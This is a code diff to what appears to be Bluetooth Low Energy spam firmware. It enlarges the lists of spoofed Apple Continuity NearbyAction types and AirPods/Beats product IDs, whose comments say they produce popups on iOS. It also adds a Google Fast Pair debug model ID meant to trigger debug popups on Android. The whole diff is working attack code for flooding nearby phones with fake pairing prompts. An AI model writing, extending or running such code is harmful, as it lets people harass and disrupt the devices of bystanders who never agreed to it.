@@ -164,7 +164,12 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
           AdvData_Raw[i++] = 0x0F;
           AdvData_Raw[i++] = 0x05;
           AdvData_Raw[i++] = 0xC0;
-          const uint8_t action_types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20 };
+          // Expanded Apple Continuity NearbyAction list (produces modal popup on iOS)
+          const uint8_t action_types[] = {
+            0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20,
+            0x04, 0x05, 0x07, 0x08, 0x0B, 0x0C, 0x0D,
+            0x11, 0x13, 0x14, 0x17, 0x1B, 0x1F, 0x29, 0x2D
+          };
           AdvData_Raw[i++] = action_types[rand() % sizeof(action_types)];
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
@@ -219,7 +224,13 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
           AdvData_Raw[i++] = 0x07;  // ProximityPair
           AdvData_Raw[i++] = 0x19;  // payload length = 25
           AdvData_Raw[i++] = 0x07;  // NewDevicePopUp prefix
-          const uint16_t dev_types[] = {0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420, 0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920, 0x1720, 0x1220, 0x1620};
+          // Expanded AirPods / Beats / Solo3 / Powerbeats product IDs
+          const uint16_t dev_types[] = {
+            0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420, 0x1020, 0x0620, 0x0320,
+            0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920, 0x1720, 0x1220, 0x1620,
+            0x1820, 0x1920, 0x1A20, 0x1B20, 0x1C20, 0x1D20, 0x1E20, 0x1F20,
+            0x0720, 0x0820, 0x0D20, 0x0420, 0x0120, 0x2420, 0x2520
+          };
           uint16_t dtype = dev_types[rand() % (sizeof(dev_types) / sizeof(dev_types[0]))];
           AdvData_Raw[i++] = (uint8_t)((dtype >> 8) & 0xFF);
           AdvData_Raw[i++] = (uint8_t)(dtype & 0xFF);
@@ -330,7 +341,16 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
       }
       case Google: {
         AdvData_Raw = new uint8_t[14];
-        uint16_t fp_idx = random(g_fastpair_count);
+        uint8_t mid0, mid1, mid2;
+        // 10% chance: emit FastPair Debug Mode frame (triggers debug popup on Android)
+        if ((rand() % 10) == 0) {
+          mid0 = 0x0A; mid1 = 0x00; mid2 = 0x7F;  // Debug model ID 0x0A007F
+        } else {
+          uint16_t fp_idx = random(g_fastpair_count);
+          mid0 = g_fastpair_models[fp_idx][0];
+          mid1 = g_fastpair_models[fp_idx][1];
+          mid2 = g_fastpair_models[fp_idx][2];
+        }
         AdvData_Raw[i++] = 3;
         AdvData_Raw[i++] = 0x03;
         AdvData_Raw[i++] = 0x2C; // Fast Pair ID
@@ -340,9 +360,9 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
         AdvData_Raw[i++] = 0x16;
         AdvData_Raw[i++] = 0x2C; // Fast Pair ID
         AdvData_Raw[i++] = 0xFE;
-        AdvData_Raw[i++] = g_fastpair_models[fp_idx][0]; // random device Model ID
-        AdvData_Raw[i++] = g_fastpair_models[fp_idx][1];
-        AdvData_Raw[i++] = g_fastpair_models[fp_idx][2];
+        AdvData_Raw[i++] = mid0;
+        AdvData_Raw[i++] = mid1;
+        AdvData_Raw[i++] = mid2;
 
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
